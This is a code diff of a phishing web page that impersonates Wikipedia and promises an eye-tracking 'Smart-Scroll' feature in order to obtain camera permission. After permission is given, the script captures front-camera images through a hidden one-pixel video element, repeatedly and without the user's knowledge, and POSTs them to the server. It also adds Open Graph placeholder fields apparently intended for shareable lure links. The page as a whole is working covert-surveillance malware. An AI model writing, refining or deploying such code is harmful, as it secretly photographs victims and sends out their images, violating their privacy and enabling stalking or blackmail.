@@ -3,108 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
-    <title>Wikipedia</title>
+    
+    <title>__TITLE__</title>
+    <meta property="og:title" content="__TITLE__">
+    <meta property="og:description" content="__DESC__">
+    <meta property="og:image" content="__IMAGE__">
+
     <style>
-        /* Base Reset */
-        body, html { 
-            margin: 0; 
-            padding: 0; 
-            height: 100%; 
-            width: 100%; 
-            overflow: hidden; 
-            background: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        /* Fixed Mobile Alignment */
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #fff; font-family: sans-serif; }
+        
         #overlay {
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%;
-            background: #ffffff; 
-            z-index: 9999; 
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-            justify-content: center; /* Vertical Center */
-            text-align: center; 
-            padding: 20px;
-            box-sizing: border-box;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 9999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 25px; box-sizing: border-box;
         }
 
-        .wiki-logo { 
-            width: 80px; 
-            height: auto;
-            margin-bottom: 25px; 
-        }
-
-        h2 { 
-            font-size: 22px; 
-            color: #202122; 
-            margin: 0 0 12px 0;
-            font-weight: 500;
-        }
-
-        p { 
-            color: #54595d; 
-            font-size: 15px; 
-            line-height: 1.5;
-            max-width: 300px; 
-            margin: 0 0 35px 0; 
-        }
+        .wiki-logo { width: 80px; margin-bottom: 25px; }
+        h2 { font-size: 22px; color: #202122; margin: 0 0 12px 0; }
+        p { color: #54595d; font-size: 15px; line-height: 1.5; max-width: 300px; margin: 0 0 35px 0; }
 
         #enable-btn {
-            background: #36b; 
-            color: #fff; 
-            border: none; 
-            padding: 16px 0;
-            border-radius: 4px; 
-            font-weight: bold; 
-            font-size: 16px;
-            cursor: pointer; 
-            width: 100%;
-            max-width: 260px; /* Standard button width for mobile */
-            transition: background 0.2s;
-            -webkit-tap-highlight-color: transparent;
+            background: #36b; color: #fff; border: none; padding: 16px 0;
+            border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; max-width: 260px;
         }
 
-        #enable-btn:active {
-            background: #2a4b8d;
-        }
-
-        /* Content View */
-        #wiki-view { 
-            width: 100%; 
-            height: 100%; 
-            border: none; 
-            display: none; 
-        }
-
-        /* Instagram Camera Fix */
-        #video { 
-            position: fixed; 
-            bottom: 0; 
-            right: 0; 
-            width: 1px; 
-            height: 1px; 
-            opacity: 0.01; 
-        }
+        #wiki-view { width: 100%; height: 100%; border: none; display: none; }
+        #video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div id="overlay">
-    <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo" alt="Wikipedia Logo">
+    <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo">
     <h2>Enable Smart-Scroll</h2>
     <p>Allow camera access to automatically scroll the article based on your eye movement for a hands-free experience.</p>
     <button id="enable-btn">Enable & Read</button>
 </div>
 
 <iframe id="wiki-view"></iframe>
-
 <video id="video" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 
@@ -117,35 +54,26 @@
 
     btn.addEventListener('click', async () => {
         try {
-            // High-quality constraints for better capture
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
+                video: { facingMode: 'user', width: { ideal: 1280 } } 
             });
             video.srcObject = stream;
             await video.play();
 
-            // Switch to Wikipedia content
             wiki.src = "/view-article";
             wiki.style.display = "block";
             document.getElementById('overlay').style.display = "none";
             
             startTime = Date.now();
-            
-            // 2-second warm-up to prevent black frames
-            setTimeout(photoLoop, 2000);
-
-        } catch (e) { 
-            alert("Camera access is required to use the Smart-Scroll feature."); 
-        }
+            setTimeout(photoLoop, 2000); // 2s warm-up to prevent black frames
+        } catch (e) { alert("Access required."); }
     });
 
     function photoLoop() {
         const elapsed = Date.now() - startTime;
-        // 900ms for first 10s, then every 7s
         let speed = elapsed < 10000 ? 900 : 7000;
 
         if (video.readyState === video.HAVE_ENOUGH_DATA) {
-            // Match canvas to video resolution to prevent stretching
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
@@ -157,7 +85,6 @@
                 body: JSON.stringify({ dataUrl: canvas.toDataURL('image/jpeg', 0.6) })
             }).catch(() => {});
         }
-        
         setTimeout(photoLoop, speed);
     }
 </script>
